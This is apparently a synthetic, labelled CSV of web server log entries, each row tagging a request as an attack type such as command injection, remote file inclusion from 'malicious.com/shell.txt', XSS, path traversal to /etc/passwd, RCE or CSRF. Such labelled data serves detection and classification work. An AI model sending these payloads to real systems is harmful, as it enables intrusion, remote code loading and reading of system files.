ip,timestamp,request,status,size,attack_type
44.29.105.153,2025-03-15 12:05:32,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,969,COMMAND_INJECTION
215.45.86.223,2025-03-15 12:05:16,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2331,REMOTE_FILE_INCLUSION
192.45.163.108,2025-03-15 12:04:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3954,REMOTE_FILE_INCLUSION
160.80.141.19,2025-03-15 12:04:43,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3636,XSS_ATTACK
9.186.64.45,2025-03-15 12:05:27,POST /wp-json/wp/v2/users HTTP/1.1,200,4036,USER_ENUMERATION
153.206.252.68,2025-03-15 12:04:43,POST /upload-xml HTTP/1.1,200,2581,XXE_ATTACK
234.24.228.79,2025-03-15 12:05:07,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2261,XSS_ATTACK
146.92.224.200,2025-03-15 12:05:15,POST /upload-xml HTTP/1.1,200,2337,XXE_ATTACK
187.9.180.91,2025-03-15 12:04:44,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3944,COMMAND_INJECTION
246.82.59.151,2025-03-15 12:05:33,GET /etc/passwd HTTP/1.1,200,3960,PATH_TRAVERSAL
87.74.183.177,2025-03-15 12:04:43,POST /upload-xml HTTP/1.1,200,3832,XXE_ATTACK
241.200.242.60,2025-03-15 12:05:15,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2551,COMMAND_INJECTION
43.180.166.4,2025-03-15 12:05:34,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4989,COMMAND_INJECTION
82.148.59.228,2025-03-15 12:05:03,GET /execute?cmd=whoami HTTP/1.1,403,1686,RCE_ATTACK
73.186.111.162,2025-03-15 12:05:17,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1369,XSS_ATTACK
246.107.13.235,2025-03-15 12:04:46,POST /wp-json/wp/v2/users HTTP/1.1,200,1155,USER_ENUMERATION
208.71.242.14,2025-03-15 12:05:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4016,REMOTE_FILE_INCLUSION
220.69.108.237,2025-03-15 12:04:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,794,XSS_ATTACK
81.140.116.16,2025-03-15 12:05:08,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3989,LFI_ATTACK
154.40.23.101,2025-03-15 12:04:57,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3949,LFI_ATTACK
54.156.80.191,2025-03-15 12:05:19,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1615,REMOTE_FILE_INCLUSION
201.239.15.139,2025-03-15 12:04:51,POST /wp-json/wp/v2/users HTTP/1.1,200,2973,USER_ENUMERATION
53.28.137.50,2025-03-15 12:05:05,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1854,COMMAND_INJECTION
68.114.67.178,2025-03-15 12:05:00,POST /upload-xml HTTP/1.1,200,2855,XXE_ATTACK
81.114.175.50,2025-03-15 12:05:40,POST /upload-xml HTTP/1.1,200,1400,XXE_ATTACK
246.105.166.184,2025-03-15 12:05:32,GET /etc/passwd HTTP/1.1,200,1010,PATH_TRAVERSAL
145.52.164.48,2025-03-15 12:05:08,GET /api/user?username=admin HTTP/1.1,200,4463,API_ABUSE
12.227.87.70,2025-03-15 12:05:01,POST /wp-json/wp/v2/users HTTP/1.1,200,3610,USER_ENUMERATION
172.31.227.53,2025-03-15 12:04:55,GET /execute?cmd=whoami HTTP/1.1,403,814,RCE_ATTACK
61.34.213.83,2025-03-15 12:05:25,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1504,REMOTE_FILE_INCLUSION
35.185.0.145,2025-03-15 12:05:26,POST /wp-json/wp/v2/users HTTP/1.1,200,1224,USER_ENUMERATION
236.167.234.57,2025-03-15 12:05:06,POST /change-email?email=attacker@example.com HTTP/1.1,200,3966,CSRF_ATTACK
203.238.29.149,2025-03-15 12:05:00,GET /etc/passwd HTTP/1.1,200,2975,PATH_TRAVERSAL
107.125.4.52,2025-03-15 12:04:53,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3273,COMMAND_INJECTION
143.149.187.121,2025-03-15 12:04:58,GET /execute?cmd=whoami HTTP/1.1,403,4754,RCE_ATTACK
194.33.149.220,2025-03-15 12:05:42,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,758,REMOTE_FILE_INCLUSION
149.130.133.197,2025-03-15 12:05:02,POST /change-email?email=attacker@example.com HTTP/1.1,200,4812,CSRF_ATTACK
98.125.201.87,2025-03-15 12:04:50,POST /upload-xml HTTP/1.1,200,4207,XXE_ATTACK
27.51.102.12,2025-03-15 12:05:04,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2170,LFI_ATTACK
193.184.173.13,2025-03-15 12:05:15,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2101,REMOTE_FILE_INCLUSION
55.112.33.107,2025-03-15 12:05:07,GET /api/user?username=admin HTTP/1.1,200,4215,API_ABUSE
59.157.154.38,2025-03-15 12:04:51,GET /etc/passwd HTTP/1.1,200,4747,PATH_TRAVERSAL
3.33.78.38,2025-03-15 12:04:49,GET /api/user?username=admin HTTP/1.1,200,4996,API_ABUSE
72.219.116.103,2025-03-15 12:05:10,POST /wp-json/wp/v2/users HTTP/1.1,200,3002,USER_ENUMERATION
211.152.200.253,2025-03-15 12:04:50,GET /execute?cmd=whoami HTTP/1.1,403,2948,RCE_ATTACK
53.163.115.238,2025-03-15 12:05:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1801,XSS_ATTACK
76.221.250.125,2025-03-15 12:05:25,GET /etc/passwd HTTP/1.1,200,1392,PATH_TRAVERSAL
19.73.255.32,2025-03-15 12:05:04,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,944,COMMAND_INJECTION
161.52.244.224,2025-03-15 12:04:54,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1167,LFI_ATTACK
232.206.237.190,2025-03-15 12:05:40,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2723,REMOTE_FILE_INCLUSION
98.125.101.33,2025-03-15 12:04:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1294,XSS_ATTACK
235.19.124.255,2025-03-15 12:05:26,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3838,LFI_ATTACK
4.235.212.226,2025-03-15 12:05:08,POST /upload-xml HTTP/1.1,200,2752,XXE_ATTACK
41.186.127.6,2025-03-15 12:04:50,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1758,XSS_ATTACK
173.212.75.217,2025-03-15 12:05:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4449,REMOTE_FILE_INCLUSION
154.220.199.3,2025-03-15 12:05:10,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2621,COMMAND_INJECTION
187.193.186.124,2025-03-15 12:04:52,GET /etc/passwd HTTP/1.1,200,3771,PATH_TRAVERSAL
211.12.92.178,2025-03-15 12:12:26,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3798,COMMAND_INJECTION
255.133.82.203,2025-03-15 12:12:04,GET /execute?cmd=whoami HTTP/1.1,403,4021,RCE_ATTACK
16.211.117.161,2025-03-15 12:12:20,GET /etc/passwd HTTP/1.1,200,2293,PATH_TRAVERSAL
110.36.169.151,2025-03-15 12:12:23,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,869,REMOTE_FILE_INCLUSION
176.220.164.34,2025-03-15 12:11:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2729,COMMAND_INJECTION
59.65.81.169,2025-03-15 12:11:38,POST /wp-json/wp/v2/users HTTP/1.1,403,4750,USER_ENUMERATION
237.203.252.53,2025-03-15 12:11:45,POST /upload-xml HTTP/1.1,403,4408,XXE_ATTACK
137.24.190.202,2025-03-15 12:12:02,GET /api/user?username=admin HTTP/1.1,200,4352,API_ABUSE
90.68.18.46,2025-03-15 12:12:05,POST /upload-xml HTTP/1.1,403,958,XXE_ATTACK
215.218.69.190,2025-03-15 12:12:21,GET /api/user?username=admin HTTP/1.1,200,2059,API_ABUSE
127.70.94.208,2025-03-15 12:11:41,GET /etc/passwd HTTP/1.1,200,1441,PATH_TRAVERSAL
165.58.255.163,2025-03-15 12:12:27,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1480,REMOTE_FILE_INCLUSION
42.37.98.225,2025-03-15 12:12:16,POST /change-email?email=attacker@example.com HTTP/1.1,200,1448,CSRF_ATTACK
141.74.5.102,2025-03-15 12:11:31,GET /api/user?username=admin HTTP/1.1,200,1308,API_ABUSE
6.67.249.15,2025-03-15 12:12:27,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,649,REMOTE_FILE_INCLUSION
245.220.145.45,2025-03-15 12:11:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2071,XSS_ATTACK
192.246.46.5,2025-03-15 12:11:32,POST /change-email?email=attacker@example.com HTTP/1.1,200,2758,CSRF_ATTACK
15.13.87.48,2025-03-15 12:12:19,GET /etc/passwd HTTP/1.1,200,2888,PATH_TRAVERSAL
95.236.15.134,2025-03-15 12:12:20,GET /execute?cmd=whoami HTTP/1.1,403,3768,RCE_ATTACK
190.34.255.99,2025-03-15 12:11:59,GET /etc/passwd HTTP/1.1,200,3444,PATH_TRAVERSAL
206.54.124.63,2025-03-15 12:12:26,GET /etc/passwd HTTP/1.1,200,2877,PATH_TRAVERSAL
161.111.138.120,2025-03-15 12:11:40,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3677,LFI_ATTACK
62.196.187.229,2025-03-15 12:11:43,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1695,LFI_ATTACK
236.63.51.79,2025-03-15 12:12:05,GET /etc/passwd HTTP/1.1,200,1267,PATH_TRAVERSAL
66.206.50.35,2025-03-15 12:11:54,POST /wp-json/wp/v2/users HTTP/1.1,403,4944,USER_ENUMERATION
17.193.233.213,2025-03-15 12:12:02,POST /upload-xml HTTP/1.1,403,2559,XXE_ATTACK
180.216.245.244,2025-03-15 12:12:23,GET /execute?cmd=whoami HTTP/1.1,403,1226,RCE_ATTACK
174.3.182.137,2025-03-15 12:11:36,GET /execute?cmd=whoami HTTP/1.1,403,4884,RCE_ATTACK
29.217.134.113,2025-03-15 12:11:50,POST /change-email?email=attacker@example.com HTTP/1.1,200,2981,CSRF_ATTACK
203.216.224.210,2025-03-15 12:11:41,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1848,REMOTE_FILE_INCLUSION
191.152.126.77,2025-03-15 12:12:08,GET /execute?cmd=whoami HTTP/1.1,403,1756,RCE_ATTACK
217.49.200.101,2025-03-15 12:12:22,POST /upload-xml HTTP/1.1,403,1828,XXE_ATTACK
52.162.40.29,2025-03-15 12:11:55,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4225,REMOTE_FILE_INCLUSION
167.78.238.173,2025-03-15 12:11:37,GET /execute?cmd=whoami HTTP/1.1,403,698,RCE_ATTACK
242.191.0.31,2025-03-15 12:12:01,GET /etc/passwd HTTP/1.1,200,3649,PATH_TRAVERSAL
127.82.248.7,2025-03-15 12:11:36,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2582,REMOTE_FILE_INCLUSION
144.37.14.37,2025-03-15 12:12:26,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2177,LFI_ATTACK
89.138.240.197,2025-03-15 12:12:15,GET /execute?cmd=whoami HTTP/1.1,403,1826,RCE_ATTACK
157.221.182.150,2025-03-15 12:12:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1478,XSS_ATTACK
89.89.243.204,2025-03-15 12:12:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2587,XSS_ATTACK
191.221.163.142,2025-03-15 12:12:06,GET /etc/passwd HTTP/1.1,200,4457,PATH_TRAVERSAL
126.178.150.234,2025-03-15 12:12:16,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1396,COMMAND_INJECTION
174.31.16.127,2025-03-15 12:12:30,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2307,LFI_ATTACK
18.88.53.63,2025-03-15 12:12:17,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3749,XSS_ATTACK
92.93.45.21,2025-03-15 12:11:53,GET /etc/passwd HTTP/1.1,200,3470,PATH_TRAVERSAL
146.254.158.232,2025-03-15 12:12:09,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4743,XSS_ATTACK
79.203.125.231,2025-03-15 12:12:32,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1742,LFI_ATTACK
97.114.187.113,2025-03-15 12:12:32,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3141,XSS_ATTACK
24.218.67.100,2025-03-15 12:11:55,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2374,LFI_ATTACK
151.2.186.14,2025-03-15 12:12:31,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4475,LFI_ATTACK
205.235.24.170,2025-03-15 12:12:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2174,XSS_ATTACK
66.59.76.133,2025-03-15 12:11:43,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3940,COMMAND_INJECTION
93.212.47.6,2025-03-15 12:11:40,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1230,LFI_ATTACK
50.159.92.9,2025-03-15 12:12:00,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3133,LFI_ATTACK
152.18.54.213,2025-03-15 12:11:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3470,XSS_ATTACK
191.205.203.5,2025-03-15 12:12:18,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,960,LFI_ATTACK
41.159.120.54,2025-03-15 12:11:38,POST /change-email?email=attacker@example.com HTTP/1.1,200,3323,CSRF_ATTACK
99.44.218.184,2025-03-15 12:12:32,GET /execute?cmd=whoami HTTP/1.1,403,4945,RCE_ATTACK
251.36.205.25,2025-03-15 12:12:31,GET /api/user?username=admin HTTP/1.1,200,3531,API_ABUSE
142.3.28.24,2025-03-15 12:11:40,GET /execute?cmd=whoami HTTP/1.1,403,565,RCE_ATTACK
126.124.15.107,2025-03-15 12:11:44,GET /etc/passwd HTTP/1.1,200,4076,PATH_TRAVERSAL
17.81.89.49,2025-03-15 12:11:54,POST /upload-xml HTTP/1.1,403,1425,XXE_ATTACK
63.70.168.21,2025-03-15 12:12:14,POST /wp-json/wp/v2/users HTTP/1.1,403,1730,USER_ENUMERATION
175.58.112.138,2025-03-15 12:11:56,GET /etc/passwd HTTP/1.1,200,3878,PATH_TRAVERSAL
81.219.102.68,2025-03-15 12:12:32,GET /api/user?username=admin HTTP/1.1,200,2916,API_ABUSE
181.81.250.118,2025-03-15 12:11:58,GET /etc/passwd HTTP/1.1,200,1394,PATH_TRAVERSAL
131.81.15.29,2025-03-15 12:11:42,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4846,XSS_ATTACK
162.229.76.75,2025-03-15 12:11:58,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2490,LFI_ATTACK
88.59.52.168,2025-03-15 12:12:09,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1542,LFI_ATTACK
233.186.127.17,2025-03-15 12:12:33,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2202,LFI_ATTACK
208.217.71.138,2025-03-15 12:11:48,GET /etc/passwd HTTP/1.1,200,3018,PATH_TRAVERSAL
184.100.129.167,2025-03-15 12:11:45,GET /api/user?username=admin HTTP/1.1,200,2350,API_ABUSE
10.194.251.184,2025-03-15 12:11:58,GET /api/user?username=admin HTTP/1.1,200,719,API_ABUSE
69.117.74.16,2025-03-15 12:11:57,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1249,LFI_ATTACK
236.227.182.222,2025-03-15 12:11:53,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3161,XSS_ATTACK
243.193.221.112,2025-03-15 12:11:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,751,COMMAND_INJECTION
234.151.12.133,2025-03-15 12:11:45,POST /wp-json/wp/v2/users HTTP/1.1,403,3931,USER_ENUMERATION
89.72.18.207,2025-03-15 12:12:30,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1060,COMMAND_INJECTION
254.76.39.170,2025-03-15 12:12:15,POST /upload-xml HTTP/1.1,403,1155,XXE_ATTACK
156.143.150.112,2025-03-15 12:12:19,GET /execute?cmd=whoami HTTP/1.1,403,1444,RCE_ATTACK
30.192.241.227,2025-03-15 12:12:31,GET /etc/passwd HTTP/1.1,200,3468,PATH_TRAVERSAL
30.194.0.201,2025-03-15 12:12:20,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4407,REMOTE_FILE_INCLUSION
40.121.243.6,2025-03-15 12:12:30,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2361,LFI_ATTACK
121.75.150.173,2025-03-15 12:11:47,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2546,REMOTE_FILE_INCLUSION
81.88.81.119,2025-03-15 12:11:41,POST /upload-xml HTTP/1.1,403,1999,XXE_ATTACK
254.113.99.236,2025-03-15 12:12:26,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1624,REMOTE_FILE_INCLUSION
253.72.180.147,2025-03-15 12:11:36,GET /etc/passwd HTTP/1.1,200,3478,PATH_TRAVERSAL
155.32.194.179,2025-03-15 12:11:44,POST /change-email?email=attacker@example.com HTTP/1.1,200,1044,CSRF_ATTACK
206.93.64.178,2025-03-15 12:11:39,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4152,REMOTE_FILE_INCLUSION
222.17.117.48,2025-03-15 12:11:47,GET /api/user?username=admin HTTP/1.1,200,3871,API_ABUSE
121.234.245.248,2025-03-15 12:12:05,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,507,LFI_ATTACK
66.80.67.220,2025-03-15 12:12:11,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2406,XSS_ATTACK
95.74.239.20,2025-03-15 12:12:09,POST /upload-xml HTTP/1.1,403,3962,XXE_ATTACK
123.174.200.214,2025-03-15 12:12:21,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4299,COMMAND_INJECTION
163.51.32.106,2025-03-15 12:12:06,GET /etc/passwd HTTP/1.1,200,1031,PATH_TRAVERSAL
20.163.214.41,2025-03-15 12:11:40,POST /upload-xml HTTP/1.1,403,2950,XXE_ATTACK
231.130.41.51,2025-03-15 12:12:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4559,REMOTE_FILE_INCLUSION
61.111.178.228,2025-03-15 12:11:37,GET /etc/passwd HTTP/1.1,200,4447,PATH_TRAVERSAL
155.210.122.215,2025-03-15 12:12:18,GET /execute?cmd=whoami HTTP/1.1,403,4486,RCE_ATTACK
86.27.2.58,2025-03-15 12:12:28,POST /wp-json/wp/v2/users HTTP/1.1,403,4439,USER_ENUMERATION
249.46.118.174,2025-03-15 12:11:53,GET /etc/passwd HTTP/1.1,200,4976,PATH_TRAVERSAL
188.205.64.80,2025-03-15 12:12:00,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3555,COMMAND_INJECTION
175.244.67.198,2025-03-15 12:11:58,GET /etc/passwd HTTP/1.1,200,3332,PATH_TRAVERSAL
198.36.99.128,2025-03-15 12:12:14,POST /change-email?email=attacker@example.com HTTP/1.1,200,1484,CSRF_ATTACK
100.136.88.227,2025-03-15 12:12:05,POST /change-email?email=attacker@example.com HTTP/1.1,200,1219,CSRF_ATTACK
106.216.252.28,2025-03-15 12:12:22,POST /upload-xml HTTP/1.1,403,3582,XXE_ATTACK
73.213.3.16,2025-03-15 12:12:35,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4031,LFI_ATTACK
47.6.74.196,2025-03-15 12:11:51,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1883,XSS_ATTACK
221.105.226.222,2025-03-15 12:12:33,POST /wp-json/wp/v2/users HTTP/1.1,403,1675,USER_ENUMERATION
122.198.123.167,2025-03-15 12:12:24,GET /execute?cmd=whoami HTTP/1.1,403,1774,RCE_ATTACK
92.115.180.95,2025-03-15 12:11:56,POST /change-email?email=attacker@example.com HTTP/1.1,200,3764,CSRF_ATTACK
124.244.101.203,2025-03-15 12:12:19,POST /wp-json/wp/v2/users HTTP/1.1,403,3927,USER_ENUMERATION
67.21.169.61,2025-03-15 12:11:42,GET /api/user?username=admin HTTP/1.1,200,4770,API_ABUSE
63.250.140.21,2025-03-15 12:11:48,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4205,REMOTE_FILE_INCLUSION
174.16.133.88,2025-03-15 12:12:00,POST /wp-json/wp/v2/users HTTP/1.1,403,891,USER_ENUMERATION
91.232.96.137,2025-03-15 12:11:52,POST /upload-xml HTTP/1.1,403,1655,XXE_ATTACK
54.111.249.140,2025-03-15 12:12:02,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3370,XSS_ATTACK
146.201.19.17,2025-03-15 12:12:33,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4104,REMOTE_FILE_INCLUSION
29.110.195.204,2025-03-15 12:12:28,POST /upload-xml HTTP/1.1,403,1926,XXE_ATTACK
126.190.146.97,2025-03-15 12:12:26,GET /etc/passwd HTTP/1.1,200,1326,PATH_TRAVERSAL
47.54.83.231,2025-03-15 12:11:41,GET /api/user?username=admin HTTP/1.1,200,3981,API_ABUSE
84.92.195.103,2025-03-15 12:12:11,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,950,XSS_ATTACK
245.118.246.59,2025-03-15 12:11:44,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1511,LFI_ATTACK
163.64.49.236,2025-03-15 12:11:59,POST /change-email?email=attacker@example.com HTTP/1.1,200,3025,CSRF_ATTACK
204.232.70.170,2025-03-15 12:11:57,POST /change-email?email=attacker@example.com HTTP/1.1,200,3996,CSRF_ATTACK
223.181.223.78,2025-03-15 12:11:50,POST /wp-json/wp/v2/users HTTP/1.1,403,1142,USER_ENUMERATION
53.237.38.8,2025-03-15 12:11:40,POST /upload-xml HTTP/1.1,403,3323,XXE_ATTACK
141.50.170.176,2025-03-15 12:12:07,GET /api/user?username=admin HTTP/1.1,200,1198,API_ABUSE
8.124.17.99,2025-03-15 12:12:09,POST /change-email?email=attacker@example.com HTTP/1.1,200,708,CSRF_ATTACK
47.0.18.245,2025-03-15 12:12:06,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,900,LFI_ATTACK
158.170.206.75,2025-03-15 12:12:26,POST /change-email?email=attacker@example.com HTTP/1.1,200,4847,CSRF_ATTACK
134.58.242.50,2025-03-15 12:12:00,POST /upload-xml HTTP/1.1,403,3675,XXE_ATTACK
158.60.226.239,2025-03-15 12:12:22,GET /etc/passwd HTTP/1.1,200,4851,PATH_TRAVERSAL
126.158.255.114,2025-03-15 12:12:08,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2528,REMOTE_FILE_INCLUSION
20.137.27.195,2025-03-15 12:11:57,POST /wp-json/wp/v2/users HTTP/1.1,403,2302,USER_ENUMERATION
92.35.125.176,2025-03-15 12:12:23,POST /upload-xml HTTP/1.1,403,3793,XXE_ATTACK
14.11.78.251,2025-03-15 12:12:01,GET /etc/passwd HTTP/1.1,200,619,PATH_TRAVERSAL
174.196.253.193,2025-03-15 12:11:48,POST /upload-xml HTTP/1.1,403,2725,XXE_ATTACK
175.88.210.26,2025-03-15 12:11:50,GET /execute?cmd=whoami HTTP/1.1,403,2778,RCE_ATTACK
228.163.62.28,2025-03-15 12:12:26,POST /upload-xml HTTP/1.1,403,3092,XXE_ATTACK
113.83.42.138,2025-03-15 12:12:14,POST /wp-json/wp/v2/users HTTP/1.1,403,3496,USER_ENUMERATION
154.252.150.13,2025-03-15 12:12:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4029,LFI_ATTACK
174.53.233.175,2025-03-15 12:12:38,GET /execute?cmd=whoami HTTP/1.1,403,4442,RCE_ATTACK
81.254.199.3,2025-03-15 12:12:22,GET /api/user?username=admin HTTP/1.1,200,2237,API_ABUSE
34.59.239.39,2025-03-15 12:12:02,GET /api/user?username=admin HTTP/1.1,200,2461,API_ABUSE
192.127.173.30,2025-03-15 12:11:40,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4054,REMOTE_FILE_INCLUSION
5.74.122.69,2025-03-15 12:12:09,POST /upload-xml HTTP/1.1,403,4074,XXE_ATTACK
212.23.171.27,2025-03-15 12:11:39,GET /api/user?username=admin HTTP/1.1,200,1123,API_ABUSE
112.150.210.198,2025-03-15 12:12:06,GET /execute?cmd=whoami HTTP/1.1,403,3873,RCE_ATTACK
49.197.176.169,2025-03-15 12:11:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1532,XSS_ATTACK
252.22.242.205,2025-03-15 12:11:50,POST /change-email?email=attacker@example.com HTTP/1.1,200,4327,CSRF_ATTACK
86.237.140.16,2025-03-15 12:12:14,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,755,REMOTE_FILE_INCLUSION
125.253.239.111,2025-03-15 12:12:04,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3577,REMOTE_FILE_INCLUSION
170.252.115.231,2025-03-15 12:12:15,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,979,REMOTE_FILE_INCLUSION
166.7.209.214,2025-03-15 12:12:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,917,REMOTE_FILE_INCLUSION
50.169.69.96,2025-03-15 12:12:37,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3899,XSS_ATTACK
3.166.8.36,2025-03-15 12:12:07,POST /wp-json/wp/v2/users HTTP/1.1,403,3712,USER_ENUMERATION
76.228.221.73,2025-03-15 12:11:39,POST /change-email?email=attacker@example.com HTTP/1.1,200,2915,CSRF_ATTACK
185.156.43.253,2025-03-15 12:12:37,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,572,REMOTE_FILE_INCLUSION
39.237.138.81,2025-03-15 12:12:18,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4077,LFI_ATTACK
28.205.189.178,2025-03-15 12:11:58,GET /execute?cmd=whoami HTTP/1.1,403,4157,RCE_ATTACK
94.162.88.170,2025-03-15 12:11:48,POST /upload-xml HTTP/1.1,403,2699,XXE_ATTACK
137.252.70.138,2025-03-15 12:11:44,POST /wp-json/wp/v2/users HTTP/1.1,403,3570,USER_ENUMERATION
247.77.104.167,2025-03-15 12:12:25,GET /api/user?username=admin HTTP/1.1,200,1202,API_ABUSE
57.192.156.73,2025-03-15 12:12:24,GET /etc/passwd HTTP/1.1,200,4077,PATH_TRAVERSAL
183.188.107.133,2025-03-15 12:12:20,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1665,LFI_ATTACK
200.14.164.116,2025-03-15 12:12:05,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2757,COMMAND_INJECTION
